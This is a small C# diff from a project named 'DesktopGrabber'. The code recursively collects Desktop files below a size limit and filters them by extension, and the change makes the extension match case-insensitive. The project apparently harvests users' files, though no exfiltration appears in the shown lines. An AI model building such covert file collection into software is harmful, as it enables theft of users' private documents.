@@ -44,7 +44,7 @@ namespace DesktopGrabber
 
                 foreach (string file in Directory.GetFiles(Environment.GetFolderPath(0), "*.*", SearchOption.AllDirectories))
                 {
-                    if (new FileInfo(file).Length <= SizeLimit && Extensions.Contains(Path.GetExtension(file)))
+                    if (new FileInfo(file).Length <= SizeLimit && Extensions.Contains(Path.GetExtension(file).ToLower()))
                     {
                         files.Add(file);
                     }
